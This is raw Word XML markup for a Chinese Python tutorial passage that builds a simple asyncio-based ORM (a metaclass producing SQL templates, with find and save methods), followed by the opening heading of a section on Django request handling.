    </w:p>
    <w:p w14:paraId="0758243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attrs.pop(k)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B7309E8"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escaped_fields = list(map(lambda f: '`%s`' % f, fields))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="674FE9A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attrs['__mappings__'] = mappings # </w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>保存属性和列的映射关系</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FC302A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attrs['__table__'] = tableName</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="774ABFB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attrs['__primary_key__'] = primaryKey # </w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>主键属性名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09A924D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attrs['__fields__'] = fields # </w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>除主键外的属性名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38F7652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 </w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>构造默认的</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>SELECT, INSERT, UPDATE</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>DELETE</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>语句</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F19970"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attrs['__select__'] = 'select `%s`, %s from `%s`' % (primaryKey, ', '.join(escaped_fields), tableName)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20981D9B"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attrs['__insert__'] = 'insert into `%s` (%s, `%s`) values (%s)' % (tableName, ', '.join(escaped_fields), primaryKey, create_args_string(len(escaped_fields) + 1))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06B4747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attrs['__update__'] = 'update `%s` set %s where `%s`=?' % (tableName, ', '.join(map(lambda f: '`%s`=?' % (mappings.get(f).name or f), fields)), primaryKey)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E4B2B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attrs['__delete__'] = 'delete from `%s` where `%s`=?' % (tableName, primaryKey)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07A86315" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00E301D8"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95285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">        return type.__new__(cls, name, bases, attrs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61EDDF3D"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这样，任何继承自</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Model</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的类（比如</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>），会自动通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ModelMetaclass</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>扫描映射关系，并存储到自身的类属性如</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>__table__</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__mappings__</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D9A135A"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然后，我们往</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Model</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>类添加</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>class</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法，就可以让所有子类调用</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>class</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AE56EF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class Model(dict):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EDFAD2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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1602E22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@classmethod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07AAA72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@asyncio.coroutine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38DAFA0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find(cls, pk):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B6B23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 find object by primary key. '</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52E0A3E1"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rs = yield from select('%s where `%s`=?' % (cls.__select__, cls.__primary_key__), [pk], 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EFBC0C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len(rs) == 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B1FB4E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None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A6B487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return cls(**rs[0])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C7317A"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User</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>类现在就可以通过类方法实现主键查找：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C1FD06"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user = yield from User.find('123')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="111491A5"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往</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Model</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>类添加实例方法，就可以让所有子类调用实例方法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D241ED6"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lastRenderedPageBreak/>
        <w:t>class Model(dict):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DBFE4E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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55BDB16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@asyncio.coroutine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="694CD3A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def save(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43608FD3"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args = list(map(self.getValueOrDefault, self.__fields__))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A7A698A"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args.append(self.getValueOrDefault(self.__primary_key__))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752FD5CE"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rows = yield from execute(self.__insert__, args)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="472A37A5"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if rows != 1:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A59FD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 xml:space="preserve">            logging.warn('failed to insert record: affected rows: %s' % rows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F2C2D8"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这样，就可以把一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>实例存入数据库：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79299EF9"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user = User(id=123, name='Michael')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CC4B3BD"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yield from user.save()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3130281C"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最后一步是完善</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，对于查找，我们可以实现以下方法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F7F9AD5" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00C51947" w:rsidRDefault="00870C85" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="225" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="0"/>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 xml:space="preserve">findAll() - </w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>根据</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>WHERE</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>条件查找；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D639CFD" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00C51947" w:rsidRDefault="00870C85" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="225" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="0"/>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 xml:space="preserve">findNumber() - </w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>根据</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>WHERE</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>条件查找，但返回的是整数，适用于</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>select count(*)</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>类型的</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="718A9E47"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以及</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>update()</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remove()</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DE6FA1C"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所有这些方法都必须用</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>@asyncio.coroutine</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>装饰，变成一个协程。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5115E8CD"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调用时需要特别注意：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5090D837"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user.save()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FC3845B"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没有任何效果，因为调用</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD0055"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="DDDDDD" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>save()</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>仅仅是创建了一个协程，并没有执行它。一定要用：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB970BF" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="0095285B" w:rsidRDefault="00870C85" w:rsidP="0095285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95285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>yield from user.save()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6727397C"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才真正执行了</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>INSERT</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>操作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66D52BAD" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00C51947" w:rsidRDefault="00870C85" w:rsidP="0095285B">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="32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最后看看我们实现的</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模块一共多少行代码？累计不到</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>300</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>多行。用</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>写一个</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是不是很容易呢？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AF97FB0" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="0095285B" w:rsidRDefault="00870C85" w:rsidP="0095285B">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:sz w:val="31"/>
          <w:szCs w:val="31"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:sz w:val="31"/>
          <w:szCs w:val="31"/>
        </w:rPr>
        <w:t>廖雪峰</w:t>
      </w:r>
      <w:hyperlink r:id="rId116" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="0095285B">
          <w:rPr>
            <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
            <w:color w:val="0593D3"/>
            <w:kern w:val="0"/>
            <w:sz w:val="31"/>
            <w:szCs w:val="31"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>day-03</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="70A455BB" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="0095285B" w:rsidRDefault="00870C85" w:rsidP="0095285B">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="360" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="33"/>
          <w:szCs w:val="33"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="33"/>
          <w:szCs w:val="33"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="33"/>
          <w:szCs w:val="33"/>
        </w:rPr>
        <w:t>处理流程分析</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B79DC1E" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00AC3224" w:rsidRDefault="00870C85" w:rsidP="0095285B">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="360" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="54" w:name="t0"/>
      <w:bookmarkEnd w:id="54"/>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>一、</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>处理过程的核心概念</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CFE6E66" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00AC3224" w:rsidRDefault="00870C85" w:rsidP="0095285B">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="36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如下图所示</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的总览图，整体上把握以下</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的组成：</w:t>
      </w:r>
    </w:p>
